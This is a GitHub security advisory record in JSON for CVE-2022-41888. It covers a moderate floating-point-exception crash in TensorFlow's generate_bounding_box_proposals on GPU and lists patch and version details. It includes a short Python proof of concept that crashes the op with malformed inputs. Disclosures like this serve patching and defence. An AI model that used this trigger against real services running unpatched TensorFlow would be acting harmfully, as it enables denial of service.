{
    "ghsaId": "GHSA-6x99-gv2v-q76v",
    "severity": "MODERATE",
    "summary": "FPE in `tf.image.generate_bounding_box_proposals`",
    "description": "### Impact\nWhen running on GPU, [`tf.image.generate_bounding_box_proposals`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) receives a `scores` input that must be of rank 4 but is not checked.\n```python\nimport tensorflow as tf\n\na = tf.constant(value=[[1.0, 1.0], [1.0, 1.0], [1.0, 1.0], [1.0, 1.0]])\nb = tf.constant(value=[1])\n\ntf.image.generate_bounding_box_proposals(scores=a,bbox_deltas=a,image_info=a,anchors=a,pre_nms_topn=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cf35502463a88ca7185a99daa7031df60b3c1c98](https://github.com/tensorflow/tensorflow/commit/cf35502463a88ca7185a99daa7031df60b3c1c98).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n",
    "permalink": "https://github.com/advisories/GHSA-6x99-gv2v-q76v",
    "publishedAt": "2022-11-21T20:41:45Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-6x99-gv2v-q76v"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-41888"
        }
    ]
}